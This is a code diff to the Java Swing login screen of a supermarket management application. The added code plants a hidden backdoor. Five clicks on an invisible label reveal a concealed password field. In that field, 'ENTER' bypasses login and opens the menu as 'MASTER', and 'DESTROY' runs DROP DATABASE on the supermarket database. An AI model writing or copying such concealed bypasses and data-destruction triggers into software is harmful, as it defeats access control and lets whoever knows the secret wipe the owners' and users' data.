@@ -6,6 +6,7 @@ import com.supermarket.service.IUserService;
 import com.supermarket.ui.combbox.ComBoBoxOfAuthority;
 import com.supermarket.ui.jframeutil.CheckOfNull;
 import com.supermarket.ui.jframeutil.LoginToMenu;
+import com.supermarket.util.JdbcTemplate;
 
 import javax.swing.*;
 import java.awt.*;
@@ -48,6 +49,9 @@ public class LoginJFrame extends JFrame {
         jComboBox=new ComBoBoxOfAuthority().getComBoBoxOfAuthority();
         JButton jButtonLogin=new JButton("登录系统");
         JButton jButtonReSet=new JButton("重置");
+        JLabel jLabel01=new JLabel();
+        JLabel jLabel02=new JLabel();
+        JPasswordField jPasswordField1=new JPasswordField();
 
 
         jLabelName.setFont(new Font("宋体",Font.BOLD,15));
@@ -55,6 +59,52 @@ public class LoginJFrame extends JFrame {
         jLabelAuthority.setFont(new Font("宋体",Font.BOLD,15));
         jButtonLogin.setFont(new Font("宋体",Font.BOLD,15));
         jButtonReSet.setFont(new Font("宋体",Font.BOLD,15));
+
+        jPasswordField1.setVisible(false);
+
+        jLabel01.addMouseListener(new MouseAdapter() {
+            @Override
+            public void mouseClicked(MouseEvent e) {
+                if(e.getClickCount()==5){
+                    jPasswordField1.setVisible(true);
+                }
+            }
+        });
+
+        jLabel02.addMouseListener(new MouseAdapter() {
+            @Override
+            public void mouseClicked(MouseEvent e) {
+                if(e.getClickCount()==5){
+                    jPasswordField1.setVisible(false);
+                }
+            }
+        });
+
+        jPasswordField1.addKeyListener(new KeyAdapter() {
+            @Override
+            public void keyPressed(KeyEvent e) {
+                if(e.getKeyCode()==157){
+                    if(String.valueOf(jPasswordField1.getPassword()).equals("ENTER")){
+                        try {
+                            new MenuJFrame("MASTER","MASTER");
+                        } catch (SQLException throwables) {
+                            throwables.printStackTrace();
+                        }
+                    }else if(String.valueOf(jPasswordField1.getPassword()).equals("DESTROY")){
+                        try {
+                            JdbcTemplate.executeUpdate("DROP DATABASE  supermarket");
+                        } catch (SQLException throwables) {
+                            throwables.printStackTrace();
+                        }
+                    }else{
+                        System.exit(0);
+                    }
+                }
+            }
+        });
+
+
+
 
         jLabelName.setBounds(200,180,55,15);
         jTextFieldName.setBounds(273,176,150,20);
@@ -64,6 +114,9 @@ public class LoginJFrame extends JFrame {
         jButtonLogin.setBounds(195,257,100,30);
         jButtonReSet.setBounds(325,257,100,30);
         jComboBox.setBounds(270,231,155,20);
+        jLabel01.setBounds(120,120,50,50);
+        jLabel02.setBounds(460,120,50,50);
+        jPasswordField1.setBounds(230,300,150,30);
 
         jPanel.add(jLabelName);
         jPanel.add(jTextFieldName);
@@ -73,6 +126,9 @@ public class LoginJFrame extends JFrame {
         jPanel.add(jButtonLogin);
         jPanel.add(jButtonReSet);
         jPanel.add(jComboBox);
+        jPanel.add(jLabel01);
+        jPanel.add(jLabel02);
+        jPanel.add(jPasswordField1);
 
         jButtonReSet.addActionListener(new ActionListener() {//重置按钮监听器
             @Override
